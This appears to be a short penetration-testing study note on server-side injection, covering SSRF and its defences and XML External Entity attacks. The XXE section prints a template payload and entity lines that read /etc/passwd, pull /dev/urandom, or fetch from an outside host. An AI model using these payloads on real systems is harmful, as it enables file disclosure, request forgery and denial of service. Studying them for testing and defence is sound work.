# Server Side Injection  

## Outline 
* SSRF (Server Side Request Forgery) 
* Files/File Upload/Logs
* Executing Commands
* Includes
* XML 
* Forward and Reverse Shells 
* Reverse Shells, TTY Cleanup 

## Server Side Include Variants 
* A:\ 
* http://
* gopher:// (and other non-http) 
* \\blah\ (UNC path) 
* localhost (and other host names) 
* ::1 (ipv6) 
* Local Web Services 

## SSRF 

Server-side requet forgery refers to when an attacker induces a server-side application to make HTTP requests not intended by the user. 

Some common examples include: 
* Causing the server to make a connection back to itself or a third parting system 
* Causing a user to reveal their password by mimicing the password reset site 
* URLs containins XML data
* [Blind SSRF](https://portswigger.net/web-security/ssrf/blind) - Blind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.


### Common SSRF Defences include 
* Blacklist-based input filters 
* Whitelist-based input filters
* Disable internal domains 
* Disable internal IPs 
* Aka Protect your infrastructure 

## XML External Entity attack 

An XML External Entity attack is a type of attack
against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request
forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts

Lots of sites are still vulnerable to XXE because it's hard to replace legacy systems. 

Vanilla Template 
 ``` <?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY>
    <!ENTITY xxe SYSTEM "{PAYLOAD}">
]>
<foo>&xxe;</foo>
```

Common points of attack 
* ` <!ENTITY xxe SYSTEM "file:///dev/urandom">`
* ` <!ENTITY xxe SYSTEM "file:///etc/passwd">`
* `<!ENTITY xxe SYSTEM "http://{IP_ADDR}/{SOME_PATH}.txt">`
*  ` <!ENTITY xxe SYSTEM "{EXTERNAL_LINK}/">`

Reference: https://www.netsparker.com/blog/web-security/xxe-xml-external-entity-attacks/


See [XML Penetration](./penetration_XXE.md) for feedifier examples.




